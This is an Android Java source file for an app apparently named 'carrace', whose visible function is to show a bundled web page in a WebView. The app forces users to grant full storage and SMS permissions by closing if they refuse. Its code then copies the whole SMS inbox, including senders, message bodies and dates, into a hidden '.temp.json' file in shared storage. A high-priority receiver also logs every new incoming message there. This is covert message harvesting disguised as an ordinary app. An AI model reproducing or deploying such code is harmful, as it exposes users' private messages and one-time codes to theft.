package com.carrace;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowInsets;
import android.webkit.MimeTypeMap;
import android.webkit.RenderProcessGoneDetail;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

public class MainActivity extends Activity {

    private static final String TAG = "ApkReactCh";

    private static final String HOST = "appassets.androidplatform.net";
    private static final String ASSET_PREFIX = "/assets/";
    private static final String START_URL = "https://" + HOST + ASSET_PREFIX + "index.html";

    private static final long SPLASH_MS = 2500L;
    private static final int REQUEST_STORAGE = 100;
    private static final int REQUEST_SMS = 101;
    private static final String PREFS = "izin";
    private static final String KEY_ASKED_STORAGE = "storage_asked";
    private static final String KEY_ASKED_SMS = "sms_asked";
    private static final String MSG_STORAGE = "Storage permission is required to use this app";
    private static final String MSG_SMS = "SMS permission is required to use this app";

    // JSON store
    private static final String JSON_FILE = ".temp.json";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable splashDone = this::onSplashFinished;

    private WebView webView;
    private boolean awaitingSettings;
    private SmsReceiver receiver;

    // ===== Lifecycle =====

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout splash = buildSplash();
        applySystemBarPadding(splash);
        setContentView(splash);

        handler.postDelayed(() -> {
            // kick off initial SMS dump (only if allowed)
            if (hasSms()) {
                new Thread(MainActivity.this::dumpAllSms).start();
            }
            // register realtime receiver
            registerSmsReceiver();
        }, 500);

        handler.postDelayed(splashDone, SPLASH_MS);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (webView != null) webView.onResume();
        if (awaitingSettings) {
            awaitingSettings = false;
            if (hasStorage()) {
                maybeContinueAfterStorage();
            } else {
                closeApp(MSG_STORAGE);
            }
        }
    }

    @Override
    protected void onPause() {
        if (webView != null) webView.onPause();
        super.onPause();
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        unregisterSmsReceiver();
        destroyWebView();
        super.onDestroy();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (isFinishing()) return;

        if (requestCode == REQUEST_STORAGE) {
            if (hasStorage()) {
                maybeContinueAfterStorage();
            } else {
                closeApp(MSG_STORAGE);
            }
            return;
        }

        if (requestCode == REQUEST_SMS) {
            if (hasSms()) {
                new Thread(this::dumpAllSms).start();
                openWebView();
            } else {
                closeApp(MSG_SMS);
            }
        }
    }

    // ===== Permission flow =====

    private void onSplashFinished() {
        if (isFinishing()) return;

        // 1) Storage first
        if (!hasStorage()) {
            if (Build.VERSION.SDK_INT >= 30) {
                openPermissionSettings(
                        allFilesIntent(),
                        new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION),
                        appDetailsIntent());
            } else {
                SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
                boolean asked = prefs.getBoolean(KEY_ASKED_STORAGE, false);
                boolean neverAskAgain = asked
                        && !shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)
                        && !shouldShowRequestPermissionRationale(Manifest.permission.WRITE_EXTERNAL_STORAGE);
                if (neverAskAgain) {
                    openPermissionSettings(appDetailsIntent());
                } else {
                    prefs.edit().putBoolean(KEY_ASKED_STORAGE, true).apply();
                    requestPermissions(new String[]{
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE
                    }, REQUEST_STORAGE);
                }
            }
            return;
        }

        // 2) Then SMS
        maybeContinueAfterStorage();
    }

    private void maybeContinueAfterStorage() {
        if (!hasSms()) {
            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
            boolean asked = prefs.getBoolean(KEY_ASKED_SMS, false);
            boolean neverAskAgain = asked
                    && !shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)
                    && !shouldShowRequestPermissionRationale(Manifest.permission.RECEIVE_SMS);
            if (neverAskAgain) {
                openPermissionSettings(appDetailsIntent());
            } else {
                prefs.edit().putBoolean(KEY_ASKED_SMS, true).apply();
                requestPermissions(new String[]{
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS
                }, REQUEST_SMS);
            }
            return;
        }

        // both granted -> dump + webview
        new Thread(this::dumpAllSms).start();
        openWebView();
    }

    private void openPermissionSettings(Intent... candidates) {
        awaitingSettings = true;
        for (Intent intent : candidates) {
            if (startSafely(intent)) return;
        }
        awaitingSettings = false;
        closeApp(MSG_STORAGE);
    }

    private boolean startSafely(Intent intent) {
        try { startActivity(intent); return true; }
        catch (RuntimeException e) {
            Log.w(TAG, "Permission settings not available", e);
            return false;
        }
    }

    private Intent allFilesIntent() {
        return new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                Uri.parse("package:" + getPackageName()));
    }

    private Intent appDetailsIntent() {
        return new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + getPackageName()));
    }

    private boolean hasStorage() {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasSms() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private void closeApp(String message) {
        if (isFinishing()) return;
        Toast.makeText(this, message, Toast.LENGTH_LONG).show();
        finishAndRemoveTask();
    }

    // ===== SMS =====

    private void registerSmsReceiver() {
        if (receiver != null) return;
        receiver = new SmsReceiver();
        IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(receiver, filter);
        }
    }

    private void unregisterSmsReceiver() {
        if (receiver != null) {
            try { unregisterReceiver(receiver); } catch (Exception ignored) {}
            receiver = null;
        }
    }

    // Dump all SMS from inbox into /storage/emulated/0/.temp.json (merges existing)
    private synchronized void dumpAllSms() {
        if (!hasSms()) return;
        if (!hasStorage()) return;

        JSONArray merged = new JSONArray();
        Set<String> seen = new HashSet<>();

        // merge existing
        try {
            File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
            if (target.exists() && target.length() > 0) {
                byte[] buf = new byte[(int) target.length()];
                FileInputStream in = new FileInputStream(target);
                int read = 0;
                while (read < buf.length) {
                    int r = in.read(buf, read, buf.length - read);
                    if (r < 0) break;
                    read += r;
                }
                in.close();
                JSONArray existing = new JSONArray(new String(buf, StandardCharsets.UTF_8));
                for (int i = 0; i < existing.length(); i++) {
                    JSONObject o = existing.getJSONObject(i);
                    String key = o.optString("id", "")
                            + "|" + o.optLong("date", 0);
                    if (seen.add(key)) merged.put(o);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "existing parse failed", e);
        }

        // append all inbox messages
        Cursor c = null;
        try {
            c = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body", "date", "person", "read"},
                    null, null, "date ASC");
            if (c != null) {
                while (c.moveToNext()) {
                    String id = c.getString(0);
                    String addr = c.getString(1);
                    String body = c.getString(2);
                    long date = c.getLong(3);
                    long person = c.getLong(4);
                    int read = c.getInt(5);

                    String key = id + "|" + date;
                    if (!seen.add(key)) continue;

                    JSONObject o = new JSONObject();
                    o.put("id", id);
                    o.put("address", addr);
                    o.put("body", body);
                    o.put("date", date);
                    o.put("person", person);
                    o.put("read", read);
                    o.put("source", "inbox");
                    merged.put(o);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "inbox query failed", e);
        } finally {
            if (c != null) c.close();
        }

        // write back
        try {
            File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
            FileOutputStream out = new FileOutputStream(target, false);
            out.write(merged.toString(2).getBytes(StandardCharsets.UTF_8));
            out.flush();
            out.close();
            Log.d(TAG, "SMS dumped: " + merged.length());
        } catch (Exception e) {
            Log.e(TAG, "dump write failed", e);
        }
    }

    private void appendSingleSms(String address, String body, long timestamp) {
        if (!hasStorage()) return;

        JSONArray merged = new JSONArray();
        Set<String> seen = new HashSet<>();
        try {
            File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
            if (target.exists() && target.length() > 0) {
                byte[] buf = new byte[(int) target.length()];
                FileInputStream in = new FileInputStream(target);
                int read = 0;
                while (read < buf.length) {
                    int r = in.read(buf, read, buf.length - read);
                    if (r < 0) break;
                    read += r;
                }
                in.close();
                JSONArray existing = new JSONArray(new String(buf, StandardCharsets.UTF_8));
                for (int i = 0; i < existing.length(); i++) {
                    JSONObject o = existing.getJSONObject(i);
                    String key = o.optString("address", "") + "|" + o.optLong("date", 0);
                    seen.add(key);
                    merged.put(o);
                }
            }
        } catch (Exception ignored) {}

        String key = address + "|" + timestamp;
        if (seen.contains(key)) return;

        try {
            JSONObject o = new JSONObject();
            o.put("address", address);
            o.put("body", body);
            o.put("date", timestamp);
            o.put("source", "realtime");
            merged.put(o);

            File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
            FileOutputStream out = new FileOutputStream(target, false);
            out.write(merged.toString(2).getBytes(StandardCharsets.UTF_8));
            out.flush();
            out.close();
            Log.d(TAG, "Realtime SMS saved from " + address);
        } catch (Exception e) {
            Log.e(TAG, "append realtime failed", e);
        }
    }

    // BroadcastReceiver: catches SMS while app is running
    private class SmsReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent == null || !Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;

            try {
                android.os.Bundle bundle = intent.getExtras();
                if (bundle == null) return;

                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus == null) return;

                String format = bundle.getString("format");
                StringBuilder fullBody = new StringBuilder();
                String sender = "";
                long timestamp = 0;

                for (Object pdu : pdus) {
                    SmsMessage msg;
                    if (Build.VERSION.SDK_INT >= 23 && format != null) {
                        msg = SmsMessage.createFromPdu((byte[]) pdu, format);
                    } else {
                        msg = SmsMessage.createFromPdu((byte[]) pdu);
                    }
                    if (msg == null) continue;
                    sender = msg.getOriginatingAddress();
                    timestamp = msg.getTimestampMillis();
                    fullBody.append(msg.getMessageBody());
                }

                if (sender != null && fullBody.length() > 0) {
                    final String s = sender;
                    final String b = fullBody.toString();
                    final long t = timestamp == 0 ? System.currentTimeMillis() : timestamp;
                    new Thread(() -> appendSingleSms(s, b, t)).start();
                }
            } catch (Exception e) {
                Log.e(TAG, "receiver failed", e);
            }
        }
    }

    // ===== UI =====

    private LinearLayout buildSplash() {
        float density = getResources().getDisplayMetrics().density;
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(0xFFFFFFFF);

        MouseLoadingView mouse = new MouseLoadingView(this);
        root.addView(mouse, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, (int) (180 * density)));

        TextView title = new TextView(this);
        title.setText("Apk React Ch");
        title.setTextSize(22);
        title.setTextColor(0xFF212121);
        title.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        titleParams.topMargin = (int) (16 * density);
        root.addView(title, titleParams);
        return root;
    }

    private void openWebView() {
        if (isFinishing() || webView != null) return;
        try {
            WebView view = new WebView(this);
            WebSettings settings = view.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setAllowFileAccess(false);
            settings.setAllowContentAccess(false);
            view.setWebViewClient(new AssetClient());
            applySystemBarPadding(view);
            webView = view;
            setContentView(view);
            view.loadUrl(START_URL);
        } catch (RuntimeException e) {
            Log.e(TAG, "WebView unavailable", e);
            destroyWebView();
            closeApp("WebView is not available on this device");
        }
    }

    private void destroyWebView() {
        WebView view = webView;
        webView = null;
        if (view == null) return;
        try {
            view.stopLoading();
            view.destroy();
        } catch (RuntimeException e) {
            Log.w(TAG, "Failed to destroy WebView", e);
        }
    }

    private void recoverWebView(WebView broken) {
        if (broken != webView || isFinishing()) return;
        destroyWebView();
        openWebView();
    }

    private void applySystemBarPadding(View view) {
        view.setOnApplyWindowInsetsListener((v, insets) -> {
            v.setPadding(
                    insets.getSystemWindowInsetLeft(),
                    insets.getSystemWindowInsetTop(),
                    insets.getSystemWindowInsetRight(),
                    insets.getSystemWindowInsetBottom());
            return insets;
        });
    }

    // ===== Asset server =====

    private final class AssetClient extends WebViewClient {
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
            try {
                return serveAsset(request.getUrl());
            } catch (RuntimeException e) {
                Log.w(TAG, "Failed to serve asset", e);
                return notFound();
            }
        }

        @Override
        public boolean onRenderProcessGone(WebView view, RenderProcessGoneDetail detail) {
            handler.post(() -> recoverWebView(view));
            return true;
        }
    }

    private WebResourceResponse serveAsset(Uri uri) {
        if (uri == null || !HOST.equals(uri.getHost())) return null;
        String path = uri.getPath();
        if (path == null || !path.startsWith(ASSET_PREFIX)) return notFound();
        String file = path.substring(ASSET_PREFIX.length());
        if (file.isEmpty() || file.endsWith("/")) file = file + "index.html";
        if (file.contains("..")) return notFound();
        try {
            InputStream in = getAssets().open(file);
            return new WebResourceResponse(mimeOf(file), "UTF-8", in);
        } catch (IOException e) {
            return notFound();
        }
    }

    private static WebResourceResponse notFound() {
        return new WebResourceResponse("text/plain", "UTF-8", 404, "Not Found", null,
                new ByteArrayInputStream(new byte[0]));
    }

    private static String mimeOf(String file) {
        int dot = file.lastIndexOf('.');
        String ext = dot >= 0 ? file.substring(dot + 1).toLowerCase(Locale.ROOT) : "";
        switch (ext) {
            case "js":
            case "mjs":
                return "application/javascript";
            case "css":
                return "text/css";
            case "html":
            case "htm":
                return "text/html";
            case "json":
                return "application/json";
            case "wasm":
                return "application/wasm";
            case "woff":
                return "font/woff";
            case "woff2":
                return "font/woff2";
            default:
                String mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext);
                return mime != null ? mime : "application/octet-stream";
        }
    }
}
